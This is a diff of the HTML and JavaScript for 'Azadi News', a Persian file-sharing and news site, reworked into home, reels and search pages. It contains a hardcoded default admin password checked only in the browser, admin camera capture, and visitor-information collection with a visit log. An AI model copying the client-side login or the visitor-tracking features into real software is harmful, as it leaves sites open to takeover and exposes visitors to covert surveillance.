@@ -31,55 +31,69 @@
         @keyframes skullDrift { 0%, 100% { transform: translateY(0) rotate(0deg) scale(1); } 25% { transform: translateY(-30px) rotate(5deg) scale(1.1); } 50% { transform: translateY(10px) rotate(-3deg) scale(0.9); } 75% { transform: translateY(-15px) rotate(2deg) scale(1.05); } }
         .particle { position: fixed; pointer-events: none; z-index: -1; background: var(--green); border-radius: 50%; animation: particleFloat linear infinite; box-shadow: 0 0 8px var(--green), 0 0 15px var(--green); }
         @keyframes particleFloat { 0% { transform: translateY(105vh) scale(0); opacity: 0; } 5% { opacity: 0.6; } 90% { opacity: 0.6; } 100% { transform: translateY(-10vh) scale(1.5); opacity: 0; } }
-        .container { max-width: 1400px; margin: 0 auto; padding: 15px; position: relative; z-index: 1; }
-        .flag-container { text-align: center; padding: 20px; }
-        .flag-emoji { font-size: 80px; animation: flagWave 4s ease-in-out infinite; filter: drop-shadow(0 0 30px rgba(255,215,0,0.6)); }
+        .container { max-width: 800px; margin: 0 auto; padding: 10px; position: relative; z-index: 1; }
+        .flag-container { text-align: center; padding: 15px; }
+        .flag-emoji { font-size: 50px; animation: flagWave 4s ease-in-out infinite; filter: drop-shadow(0 0 20px rgba(255,215,0,0.5)); }
         @keyframes flagWave { 0%, 100% { transform: rotate(0deg) scale(1); } 25% { transform: rotate(2deg) scale(1.03); } 75% { transform: rotate(-2deg) scale(0.97); } }
-        .header { background: var(--panel); border: 1px solid rgba(255,215,0,0.3); border-radius: var(--radius); padding: 20px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; box-shadow: 0 0 30px rgba(255,215,0,0.1); backdrop-filter: blur(15px); }
-        .brand { display: flex; align-items: center; gap: 12px; }
-        .brand h1 { font-size: 28px; font-weight: 900; color: var(--gold); text-shadow: 0 0 20px var(--gold); }
-        .brand p { font-size: 10px; color: #888; letter-spacing: 2px; }
-        .btn { padding: 10px 20px; border: 1px solid rgba(255,215,0,0.5); border-radius: 25px; cursor: pointer; font-size: 13px; font-weight: 700; transition: var(--transition); background: transparent; color: var(--gold); font-family: var(--font); display: inline-flex; align-items: center; gap: 6px; white-space: nowrap; text-decoration: none; }
-        .btn:hover { background: var(--gold); color: #000; box-shadow: 0 0 30px rgba(255,215,0,0.4); transform: translateY(-2px); }
+        .header { background: var(--panel); border: 1px solid rgba(255,215,0,0.3); border-radius: var(--radius); padding: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; box-shadow: 0 0 20px rgba(255,215,0,0.1); backdrop-filter: blur(10px); }
+        .brand { display: flex; align-items: center; gap: 10px; }
+        .brand h1 { font-size: 22px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px var(--gold); }
+        .btn { padding: 8px 16px; border: 1px solid rgba(255,215,0,0.5); border-radius: 20px; cursor: pointer; font-size: 12px; font-weight: 700; transition: var(--transition); background: transparent; color: var(--gold); font-family: var(--font); display: inline-flex; align-items: center; gap: 5px; white-space: nowrap; }
+        .btn:hover { background: var(--gold); color: #000; box-shadow: 0 0 20px rgba(255,215,0,0.3); transform: translateY(-2px); }
         .btn-primary { background: linear-gradient(135deg, var(--gold), #d4a017); color: #000; border-color: var(--gold); }
         .btn-danger { border-color: var(--red); color: var(--red); }
         .btn-danger:hover { background: var(--red); color: #fff; }
-        .btn-sm { padding: 6px 14px; font-size: 11px; }
-        .btn-xs { padding: 4px 10px; font-size: 10px; border-radius: 15px; }
+        .btn-sm { padding: 5px 10px; font-size: 10px; }
+        .btn-xs { padding: 3px 8px; font-size: 9px; border-radius: 12px; }
         .btn-block { width: 100%; justify-content: center; }
-        .main-grid { display: grid; grid-template-columns: 1fr 340px; gap: 20px; margin-bottom: 20px; }
-        @media (max-width: 1100px) { .main-grid { grid-template-columns: 1fr; } }
-        .section-panel { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); padding: 20px; margin-bottom: 20px; backdrop-filter: blur(5px); }
-        .section-title { font-size: 20px; font-weight: 900; color: var(--gold); margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
-        .news-card { background: #000; border: 1px solid rgba(255,215,0,0.1); border-radius: 12px; padding: 18px; margin-bottom: 12px; transition: var(--transition); cursor: pointer; }
-        .news-card:hover { border-color: var(--gold); box-shadow: 0 0 25px rgba(255,215,0,0.15); transform: translateY(-3px); }
-        .news-date { font-size: 10px; color: #888; margin-bottom: 6px; }
-        .news-title { font-size: 16px; font-weight: 900; color: var(--gold); margin-bottom: 8px; }
-        .news-body { font-size: 13px; color: #aaa; line-height: 1.8; }
-        .news-image { width: 100%; max-height: 300px; object-fit: cover; border-radius: 10px; margin: 10px 0; }
-        .category-tabs { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 15px; }
-        .category-tab { padding: 8px 16px; border: 1px solid rgba(255,215,0,0.3); border-radius: 20px; cursor: pointer; font-size: 12px; font-weight: 600; transition: var(--transition); background: transparent; color: var(--text); font-family: var(--font); }
-        .category-tab:hover { border-color: var(--gold); background: rgba(255,215,0,0.1); }
-        .category-tab.active { background: var(--gold); color: #000; border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.3); }
-        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; }
-        .file-card { background: #000; border: 1px solid rgba(255,215,0,0.15); border-radius: 10px; overflow: hidden; transition: var(--transition); cursor: pointer; }
-        .file-card:hover { border-color: var(--gold); transform: translateY(-4px); box-shadow: 0 10px 25px rgba(255,215,0,0.2); }
-        .file-preview { width: 100%; height: 130px; object-fit: cover; background: #000; }
-        .file-icon-placeholder { width: 100%; height: 130px; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #1a1a1a, #0a0a0a); font-size: 45px; flex-direction: column; gap: 5px; }
-        .file-ext { font-size: 12px; color: var(--gold); font-weight: 700; }
-        .file-info { padding: 10px; }
-        .file-name { font-weight: 700; font-size: 11px; color: #fff; margin-bottom: 4px; word-break: break-all; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-        .file-meta { font-size: 9px; color: #888; display: flex; justify-content: space-between; flex-wrap: wrap; }
-        .sidebar { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); padding: 20px; position: sticky; top: 20px; max-height: 85vh; overflow-y: auto; }
-        .sidebar h3 { font-size: 16px; font-weight: 900; color: var(--gold); text-align: center; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,215,0,0.2); }
+
+        /* ========== PAGES ========== */
+        .page { display: none; }
+        .page.active { display: block; }
+
+        /* ========== HOME PAGE ========== */
+        .post-card { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); margin-bottom: 15px; overflow: hidden; transition: var(--transition); }
+        .post-card:hover { border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.1); }
+        .post-header { display: flex; align-items: center; gap: 10px; padding: 12px 15px; }
+        .post-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--gold); display: flex; align-items: center; justify-content: center; font-weight: 900; color: #000; font-size: 14px; }
+        .post-user { font-weight: 700; font-size: 13px; color: var(--gold); }
+        .post-date { font-size: 9px; color: #888; }
+        .post-media { width: 100%; max-height: 400px; object-fit: contain; background: #000; }
+        .post-video { width: 100%; max-height: 400px; background: #000; }
+        .post-body { padding: 12px 15px; font-size: 12px; color: #aaa; line-height: 1.6; }
+        .post-title { font-weight: 900; font-size: 14px; color: var(--gold); margin-bottom: 5px; }
+        .post-actions { display: flex; gap: 15px; padding: 8px 15px; border-top: 1px solid rgba(255,215,0,0.1); }
+        .post-action { color: #888; cursor: pointer; font-size: 11px; display: flex; align-items: center; gap: 4px; transition: var(--transition); }
+        .post-action:hover { color: var(--gold); }
+
+        /* ========== REELS PAGE ========== */
+        .reels-container { display: flex; flex-direction: column; gap: 2px; }
+        .reel-card { position: relative; width: 100%; height: 70vh; background: #000; border-radius: var(--radius); overflow: hidden; cursor: pointer; margin-bottom: 10px; }
+        .reel-card video, .reel-card img { width: 100%; height: 100%; object-fit: cover; }
+        .reel-overlay { position: absolute; bottom: 0; left: 0; width: 100%; padding: 30px 15px 15px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); }
+        .reel-title { font-weight: 900; font-size: 14px; color: #fff; margin-bottom: 4px; }
+        .reel-meta { font-size: 10px; color: #aaa; }
+        .reel-play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); font-size: 50px; color: rgba(255,255,255,0.8); transition: var(--transition); }
+        .reel-card:hover .reel-play-btn { transform: translate(-50%,-50%) scale(1.2); }
+
+        /* ========== SEARCH PAGE ========== */
+        .search-page { padding: 15px 0; }
+        .search-input { width: 100%; padding: 14px 20px; background: #000; border: 1px solid rgba(255,215,0,0.3); border-radius: 25px; color: #fff; font-size: 14px; font-family: var(--font); outline: none; margin-bottom: 15px; transition: var(--transition); }
+        .search-input:focus { border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.2); }
+        .search-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px; }
+        .search-item { aspect-ratio: 1; background: #000; border-radius: 6px; overflow: hidden; cursor: pointer; transition: var(--transition); }
+        .search-item:hover { opacity: 0.8; transform: scale(1.02); }
+        .search-item img, .search-item video { width: 100%; height: 100%; object-fit: cover; }
+
+        /* ========== ADMIN PANEL ========== */
         .admin-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.97); z-index: 9999; overflow-y: auto; display: none; }
         .admin-overlay.active { display: block; }
-        .admin-container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .admin-container { max-width: 1000px; margin: 0 auto; padding: 20px; }
         .admin-close-btn { position: fixed; top: 20px; right: 20px; font-size: 30px; color: var(--red); cursor: pointer; z-index: 10000; background: var(--panel); border: 1px solid var(--red); border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; transition: var(--transition); }
         .admin-close-btn:hover { transform: scale(1.1) rotate(90deg); box-shadow: 0 0 25px rgba(255,0,64,0.5); }
         .admin-header-card { background: var(--panel); border: 1px solid var(--gold); border-radius: var(--radius); padding: 25px; text-align: center; margin-bottom: 20px; box-shadow: 0 0 40px rgba(255,215,0,0.2); }
-        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr)); gap: 15px; margin-bottom: 20px; }
-        .admin-card { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); padding: 20px; transition: var(--transition); }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .admin-card { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); padding: 20px; }
         .admin-card h4 { font-size: 15px; font-weight: 900; color: var(--gold); margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid rgba(255,215,0,0.2); }
         .admin-label { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; font-weight: 700; }
         .admin-input, .admin-textarea, .admin-select { width: 100%; padding: 10px 14px; background: #000; border: 1px solid rgba(255,215,0,0.3); border-radius: 10px; color: #fff; font-size: 12px; font-family: var(--font); outline: none; margin-bottom: 8px; transition: var(--transition); }
@@ -98,10 +112,18 @@
         .social-link { padding: 8px 14px; border-radius: 20px; font-size: 10px; font-weight: 700; text-decoration: none; color: #fff; transition: var(--transition); display: flex; align-items: center; gap: 5px; }
         .social-link:hover { transform: scale(1.05); }
         .social-telegram{background:#08c}.social-bale{background:#2ecc71}.social-instagram{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}.social-eitaa{background:#ff8c00}.social-rubika{background:#ffd700;color:#000}.social-shad{background:#00bfa5}.social-phone{background:#555}
+        .camera-container { text-align: center; padding: 10px; }
+        .camera-container video { width: 100%; max-width: 300px; border-radius: 10px; border: 2px solid var(--green); display: none; }
+        .camera-container canvas { display: none; }
+        .camera-container img { width: 100%; max-width: 300px; border-radius: 10px; display: none; }
+
+        /* ========== FOOTER BAR ========== */
         .footer-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--panel); border-top: 1px solid rgba(255,215,0,0.3); display: flex; justify-content: space-around; padding: 10px 0; z-index: 999; }
         .footer-bar .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: #888; cursor: pointer; transition: var(--transition); font-size: 10px; }
         .footer-bar .nav-item:hover, .footer-bar .nav-item.active { color: var(--gold); }
         .footer-bar .nav-item i { font-size: 20px; }
+
+        /* ========== MODAL ========== */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
         .modal.active { display: flex; }
         .modal-content { background: var(--panel); border: 1px solid var(--gold); border-radius: var(--radius); padding: 25px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; box-shadow: 0 0 50px rgba(255,215,0,0.2); }
@@ -110,17 +132,15 @@
         .modal-close:hover { transform: scale(1.2) rotate(90deg); }
         .upload-zone { border: 2px dashed rgba(255,215,0,0.3); border-radius: var(--radius); padding: 30px; text-align: center; cursor: pointer; transition: var(--transition); margin-bottom: 15px; }
         .upload-zone:hover { border-color: var(--gold); box-shadow: 0 0 25px rgba(255,215,0,0.1); }
-        .camera-container { text-align: center; padding: 10px; }
-        .camera-container video { width: 100%; max-width: 300px; border-radius: 10px; border: 2px solid var(--green); display: none; }
-        .camera-container canvas { display: none; }
-        .camera-container img { width: 100%; max-width: 300px; border-radius: 10px; display: none; }
+
         .notification { position: fixed; top: 15px; right: 15px; background: var(--panel); border: 1px solid var(--green); color: var(--green); padding: 10px 20px; border-radius: 12px; z-index: 99999; font-weight: 700; font-size: 12px; animation: slideIn 0.3s ease; max-width: 400px; }
         @keyframes slideIn { from{transform:translateX(120%);opacity:0} to{transform:translateX(0);opacity:1} }
         .loading-spinner { display: inline-block; width: 30px; height: 30px; border: 3px solid rgba(255,215,0,0.3); border-radius: 50%; border-top-color: var(--gold); animation: spin 0.8s linear infinite; }
         @keyframes spin { to{transform:rotate(360deg)} }
+        .pulse-dot { display: inline-block; width: 8px; height: 8px; background: var(--green); border-radius: 50%; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(0,255,65,0.4)} 50%{box-shadow:0 0 0 10px rgba(0,255,65,0)} }
         ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background: #000; } ::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 3px; }
-        @media (max-width: 768px) { .header { flex-direction: column; text-align: center; } .brand { flex-direction: column; } .brand h1 { font-size: 20px; } .file-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); } .admin-grid { grid-template-columns: 1fr; } .theme-grid { grid-template-columns: repeat(2, 1fr); } }
-        @media (max-width: 480px) { .file-grid { grid-template-columns: 1fr 1fr; } .category-tabs { justify-content: center; } }
+        @media (max-width: 768px) { .brand h1 { font-size: 18px; } .admin-grid { grid-template-columns: 1fr; } .theme-grid { grid-template-columns: repeat(2, 1fr); } }
     </style>
 </head>
 <body>
@@ -132,57 +152,38 @@
     <div class="container">
         <div class="flag-container">
             <div class="flag-emoji">🦁☀️⚔️</div>
-            <h2 style="color:var(--gold);text-shadow:0 0 20px var(--gold);font-size:26px;" id="siteName">آزادی نیوز</h2>
-            <p style="color:#888;font-size:12px;" id="siteSlogan">بازار سیاه دیجیتال | شیر و خورشید جاوید شاه</p>
+            <h2 style="color:var(--gold);text-shadow:0 0 15px var(--gold);font-size:20px;" id="siteName">آزادی نیوز</h2>
         </div>
 
-        <header class="header">
-            <div class="brand">
-                <span style="font-size:40px;">🦁</span>
-                <div><h1 id="headerTitle">آزادی نیوز</h1><p>⚡ AZADI NEWS | Daniyal Shahraki</p></div>
-            </div>
-            <div style="display:flex;gap:8px;flex-wrap:wrap;" id="headerButtons">
-                <button class="btn btn-sm" onclick="openAdminPanel()"><i class="fas fa-user-shield"></i> مدیریت</button>
-            </div>
-        </header>
+        <!-- ========== PAGE 1: HOME (Posts) ========== -->
+        <div class="page active" id="pageHome">
+            <div id="postsContainer"></div>
+            <div id="loadingMore" style="text-align:center;padding:20px;display:none;"><span class="loading-spinner"></span></div>
+        </div>
 
-        <div class="main-grid">
-            <div id="mainContent">
-                <div class="section-panel"><div class="section-title"><i class="fas fa-newspaper"></i> آخرین اخبار</div><div id="newsContainer"></div></div>
-                <div class="section-panel">
-                    <div class="section-title"><i class="fas fa-folder-open"></i> فایل‌ها</div>
-                    <div class="category-tabs">
-                        <button class="category-tab active" onclick="filterFiles('all',this)">همه</button>
-                        <button class="category-tab" onclick="filterFiles('music',this)">🎵</button>
-                        <button class="category-tab" onclick="filterFiles('video',this)">🎬</button>
-                        <button class="category-tab" onclick="filterFiles('image',this)">🖼️</button>
-                        <button class="category-tab" onclick="filterFiles('app',this)">📱</button>
-                        <button class="category-tab" onclick="filterFiles('doc',this)">📄</button>
-                        <button class="category-tab" onclick="filterFiles('pdf',this)">📕</button>
-                        <button class="category-tab" onclick="filterFiles('zip',this)">📦</button>
-                        <button class="category-tab" onclick="filterFiles('exe',this)">💻</button>
-                        <button class="category-tab" onclick="filterFiles('apk',this)">📱</button>
-                    </div>
-                    <input type="text" class="admin-input" placeholder="🔍 جستجو..." id="searchInput" oninput="displayFiles()">
-                    <div class="file-grid" id="fileGrid"></div>
-                    <div id="loadingMore" style="text-align:center;padding:20px;display:none;"><span class="loading-spinner"></span></div>
-                </div>
+        <!-- ========== PAGE 2: REELS (Videos & Images) ========== -->
+        <div class="page" id="pageReels">
+            <div class="reels-container" id="reelsContainer"></div>
+        </div>
+
+        <!-- ========== PAGE 3: SEARCH ========== -->
+        <div class="page" id="pageSearch">
+            <div class="search-page">
+                <input type="text" class="search-input" placeholder="🔍 جستجو در همه فایل‌ها..." id="globalSearch" oninput="searchAll()">
+                <div class="search-grid" id="searchGrid"></div>
             </div>
-            <aside class="sidebar">
-                <h3>📊 اطلاعات شما</h3>
-                <div class="info-box" id="userInfoBox" style="max-height:500px;"><p style="color:#888;text-align:center;">در حال جمع‌آوری...</p></div>
-                <div style="margin-top:15px;"><div class="admin-label">🔗 ارتباط</div><div class="social-links" id="socialLinksContainer"></div></div>
-            </aside>
         </div>
     </div>
 
+    <!-- ========== FOOTER BAR ========== -->
     <div class="footer-bar">
-        <div class="nav-item active" onclick="scrollToTop()"><i class="fas fa-home"></i><span>خانه</span></div>
-        <div class="nav-item" onclick="scrollToNews()"><i class="fas fa-newspaper"></i><span>اخبار</span></div>
-        <div class="nav-item" onclick="scrollToFiles()"><i class="fas fa-folder"></i><span>فایل‌ها</span></div>
+        <div class="nav-item active" data-page="home" onclick="switchPage('home', this)"><i class="fas fa-home"></i><span>خانه</span></div>
+        <div class="nav-item" data-page="reels" onclick="switchPage('reels', this)"><i class="fas fa-play-circle"></i><span>Reels</span></div>
+        <div class="nav-item" data-page="search" onclick="switchPage('search', this)"><i class="fas fa-search"></i><span>جستجو</span></div>
         <div class="nav-item" onclick="openAdminPanel()"><i class="fas fa-cog"></i><span>مدیریت</span></div>
     </div>
 
+    <!-- ========== ADMIN PANEL OVERLAY ========== -->
     <div class="admin-overlay" id="adminOverlay">
         <span class="admin-close-btn" onclick="closeAdminPanel()">&times;</span>
         <div class="admin-container">
@@ -194,21 +195,24 @@
             </div>
             <div id="adminContent" style="display:none;">
                 <div class="admin-grid">
-                    <div class="admin-card"><h4>⚙️ تنظیمات</h4><input class="admin-input" id="setSiteName" placeholder="نام سایت"><input class="admin-input" id="setSlogan" placeholder="شعار"><input type="password" class="admin-input" id="setSitePass" placeholder="رمز ورود"><input type="password" class="admin-input" id="setAdminPass" placeholder="رمز پنل"><button class="btn btn-success btn-block" onclick="saveSettings()">ذخیره</button></div>
-                    <div class="admin-card"><h4>🎨 ظاهر</h4><input class="admin-input" id="setLogoUrl" placeholder="لینک لوگو"><input class="admin-input" id="setBgUrl" placeholder="لینک پس‌زمینه"><select class="admin-select" id="setBgType"><option value="none">بدون</option><option value="image">عکس</option><option value="video">فیلم</option></select><div class="theme-grid" id="themeGrid"></div><button class="btn btn-success btn-block" onclick="saveSettings()">ذخیره</button></div>
-                    <div class="admin-card"><h4>🔗 ارتباط</h4><input class="admin-input" id="setTelegram" placeholder="تلگرام"><input class="admin-input" id="setBale" placeholder="بله"><input class="admin-input" id="setInstagram" placeholder="اینستاگرام"><input class="admin-input" id="setEitaa" placeholder="ایتا"><input class="admin-input" id="setRubika" placeholder="روبیکا"><input class="admin-input" id="setShad" placeholder="شاد"><input class="admin-input" id="setPhone" placeholder="شماره"><button class="btn btn-success btn-block" onclick="saveSettings()">ذخیره</button></div>
+                    <div class="admin-card"><h4>⚙️ تنظیمات</h4><input class="admin-input" id="setSiteName" placeholder="نام سایت"><input class="admin-input" id="setSlogan" placeholder="شعار"><input type="password" class="admin-input" id="setSitePass" placeholder="رمز ورود"><input type="password" class="admin-input" id="setAdminPass" placeholder="رمز پنل"><button class="btn btn-primary btn-block" onclick="saveSettings()">ذخیره</button></div>
+                    <div class="admin-card"><h4>🎨 ظاهر</h4><input class="admin-input" id="setLogoUrl" placeholder="لینک لوگو"><div class="theme-grid" id="themeGrid"></div><button class="btn btn-primary btn-block" onclick="saveSettings()">ذخیره</button></div>
+                    <div class="admin-card"><h4>🔗 ارتباط</h4><input class="admin-input" id="setTelegram" placeholder="تلگرام"><input class="admin-input" id="setBale" placeholder="بله"><input class="admin-input" id="setInstagram" placeholder="اینستاگرام"><input class="admin-input" id="setPhone" placeholder="شماره"><button class="btn btn-primary btn-block" onclick="saveSettings()">ذخیره</button></div>
                     <div class="admin-card"><h4>📸 دوربین</h4><div class="camera-container"><video id="cameraVideo" autoplay playsinline></video><canvas id="cameraCanvas"></canvas><img id="cameraPhoto" alt="عکس"><button class="btn btn-sm" onclick="requestCamera('user')">دوربین جلو</button><button class="btn btn-sm" onclick="requestCamera('environment')">دوربین عقب</button><button class="btn btn-sm" id="captureBtn" onclick="capturePhoto()" style="display:none;">📸 شاتر</button></div></div>
                     <div class="admin-card"><h4>📊 اطلاعات کاربر</h4><button class="btn btn-sm" onclick="collectUserInfoAdmin()">بروزرسانی</button><div class="info-box" id="adminUserInfoBox"></div></div>
                     <div class="admin-card"><h4>📋 تاریخچه</h4><div class="info-box" id="visitLogBox"></div></div>
-                    <div class="admin-card"><h4>🗂️ مدیریت</h4><button class="btn btn-danger btn-block" onclick="deleteAllFiles()">حذف همه فایل‌ها</button><button class="btn btn-primary btn-block" onclick="showUploadModal()">📤 آپلود فایل</button><button class="btn btn-primary btn-block" onclick="showNewsModal()">📰 خبر جدید</button></div>
+                    <div class="admin-card"><h4>🗂️ مدیریت</h4><button class="btn btn-danger btn-block" onclick="deleteAllFiles()">حذف همه</button><button class="btn btn-primary btn-block" onclick="showUploadModal()">📤 آپلود</button><button class="btn btn-primary btn-block" onclick="showNewsModal()">📰 خبر</button></div>
                 </div>
             </div>
         </div>
     </div>
 
+    <!-- ========== UPLOAD MODAL ========== -->
     <div class="modal" id="uploadModal">
         <div class="modal-content"><span class="modal-close" onclick="closeUploadModal()">&times;</span><h3>آپلود</h3><input type="file" id="fileInput" multiple style="display:none;" onchange="handleFileSelect(this.files)"><div class="upload-zone" onclick="document.getElementById('fileInput').click()">☠️ کلیک کنید</div><div id="selectedFilesList"></div><select class="admin-select" id="expirySelect"><option value="7">۱ هفته</option><option value="14">۲ هفته</option><option value="30">۱ ماه</option><option value="0" selected>دائمی</option></select><button class="btn btn-block" onclick="uploadFiles()" style="background:var(--gold);color:#000;">آپلود</button></div>
     </div>
+
+    <!-- ========== NEWS MODAL ========== -->
     <div class="modal" id="newsModal">
         <div class="modal-content"><span class="modal-close" onclick="closeNewsModal()">&times;</span><h3>خبر</h3><input class="admin-input" id="newsTitleInput" placeholder="عنوان"><textarea class="admin-textarea" id="newsBodyInput" placeholder="متن"></textarea><input class="admin-input" id="newsImageInput" placeholder="لینک عکس"><select class="admin-select" id="newsExpirySelect"><option value="7">۱ هفته</option><option value="14">۲ هفته</option><option value="30">۱ ماه</option><option value="0">دائمی</option></select><button class="btn btn-block" onclick="addNews()" style="background:var(--gold);color:#000;">انتشار</button></div>
     </div>
@@ -217,7 +221,7 @@
         const WORKER_URL = 'https://azadi-news-bot.d099173878.workers.dev';
         const DEFAULT_ADMIN_PASS = '#0.0.0.0.0.0.0.0...HACKING...0.1';
         const SP = 'azadi_';
-        let isAdmin = false, selectedFiles = [], currentFilter = 'all', cameraStream = null, rainbowInterval = null;
+        let isAdmin = false, selectedFiles = [], cameraStream = null, rainbowInterval = null, currentPage = 'home';
 
         const themes = {
             dark:{bg:'#0a0a0a',panel:'#111',text:'#ccc',gold:'#ffd700',green:'#00ff41'},
@@ -272,48 +276,50 @@
             g.innerHTML=Object.keys(themes).map(k=>`<div class="theme-btn ${s===k?'active':''}" data-theme="${k}" style="background:${themes[k].bg};color:${themes[k].gold};" onclick="changeTheme('${k}')">${k.toUpperCase()}</div>`).join('');
         }
 
+        // ========== PAGE SWITCHING ==========
+        function switchPage(page, btn){
+            currentPage = page;
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.footer-bar .nav-item').forEach(n => n.classList.remove('active'));
+            $(`page${page.charAt(0).toUpperCase()+page.slice(1)}`).classList.add('active');
+            if(btn) btn.classList.add('active');
+            if(page === 'home') displayPosts();
+            if(page === 'reels') displayReels();
+            if(page === 'search') searchAll();
+        }
+
+        // ========== ADMIN ==========
         function openAdminPanel(){$('adminOverlay').classList.add('active');document.body.style.overflow='hidden';}
         function closeAdminPanel(){$('adminOverlay').classList.remove('active');document.body.style.overflow='';}
         function adminLogin(){
             if($('adminPassInput').value===(gs('admin_pass')||DEFAULT_ADMIN_PASS)){
                 isAdmin=true;$('adminContent').style.display='block';$('adminLoginError').style.display='none';
-                loadSettings();displayVisitLog();collectUserInfoAdmin();displayFiles();displayNews();updateHeaderButtons();
+                loadSettings();displayVisitLog();collectUserInfoAdmin();displayPosts();displayReels();updateHeaderButtons();
                 notify('✅ ورود مدیر');
             }else{$('adminLoginError').style.display='block';}
         }
-        function adminLogout(){isAdmin=false;$('adminContent').style.display='none';updateHeaderButtons();displayFiles();displayNews();notify('👋 خروج');}
-
+        function adminLogout(){isAdmin=false;$('adminContent').style.display='none';updateHeaderButtons();displayPosts();displayReels();notify('👋 خروج');}
         function updateHeaderButtons(){
-            const hb=$('headerButtons');
+            const hb = document.querySelector('.header-actions');
+            if(!hb) return;
             if(isAdmin){
-                hb.innerHTML=`
-                    <button class="btn btn-sm" onclick="showUploadModal()"><i class="fas fa-upload"></i> آپلود</button>
-                    <button class="btn btn-sm" onclick="showNewsModal()"><i class="fas fa-plus"></i> خبر</button>
-                    <button class="btn btn-sm" onclick="openAdminPanel()"><i class="fas fa-user-shield"></i> مدیریت</button>
-                    <button class="btn btn-sm btn-danger" onclick="adminLogout()"><i class="fas fa-sign-out-alt"></i> خروج</button>
-                `;
+                hb.innerHTML = `<button class="btn btn-sm" onclick="showUploadModal()">📤</button><button class="btn btn-sm" onclick="showNewsModal()">📰</button><button class="btn btn-sm btn-danger" onclick="adminLogout()">🚪</button>`;
             } else {
-                hb.innerHTML=`<button class="btn btn-sm" onclick="openAdminPanel()"><i class="fas fa-user-shield"></i> مدیریت</button>`;
+                hb.innerHTML = `<button class="btn btn-sm" onclick="openAdminPanel()">⚙️</button>`;
             }
         }
 
-        function loadSettings(){const s=gs('settings')||{};['setSiteName','setSlogan','setSitePass','setAdminPass','setTelegram','setBale','setInstagram','setEitaa','setRubika','setShad','setPhone','setLogoUrl','setBgUrl','setBgType'].forEach(id=>{const el=$(id);if(el)el.value=s[id.replace('set','').toLowerCase()]||(id==='setPhone'?'09917387803':'');});applySettings(s);}
+        function loadSettings(){const s=gs('settings')||{};['setSiteName','setSlogan','setSitePass','setAdminPass','setTelegram','setBale','setInstagram','setPhone','setLogoUrl'].forEach(id=>{const el=$(id);if(el)el.value=s[id.replace('set','').toLowerCase()]||(id==='setPhone'?'09917387803':'');});applySettings(s);}
         function saveSettings(){
-            const s={siteName:$('setSiteName')?.value||'آزادی نیوز',slogan:$('setSlogan')?.value||'',sitePass:$('setSitePass')?.value||'',adminPass:$('setAdminPass')?.value||'',telegram:$('setTelegram')?.value||'',bale:$('setBale')?.value||'',instagram:$('setInstagram')?.value||'',eitaa:$('setEitaa')?.value||'',rubika:$('setRubika')?.value||'',shad:$('setShad')?.value||'',phone:$('setPhone')?.value||'09917387803',logoUrl:$('setLogoUrl')?.value||'',bgUrl:$('setBgUrl')?.value||'',bgType:$('setBgType')?.value||'none'};
+            const s={siteName:$('setSiteName')?.value||'آزادی نیوز',slogan:$('setSlogan')?.value||'',sitePass:$('setSitePass')?.value||'',adminPass:$('setAdminPass')?.value||'',telegram:$('setTelegram')?.value||'',bale:$('setBale')?.value||'',instagram:$('setInstagram')?.value||'',phone:$('setPhone')?.value||'09917387803',logoUrl:$('setLogoUrl')?.value||''};
             ss('settings',s);if(s.adminPass)ss('admin_pass',s.adminPass);applySettings(s);notify('✅ ذخیره شد');
         }
         function applySettings(s){
-            if(s.siteName){const sn=$('siteName'),ht=$('headerTitle');if(sn)sn.textContent=s.siteName;if(ht)ht.textContent=s.siteName;document.title='🦁 '+s.siteName+' | AZADI NEWS';}
-            if(s.slogan){const ss=$('siteSlogan');if(ss)ss.textContent=s.slogan;}
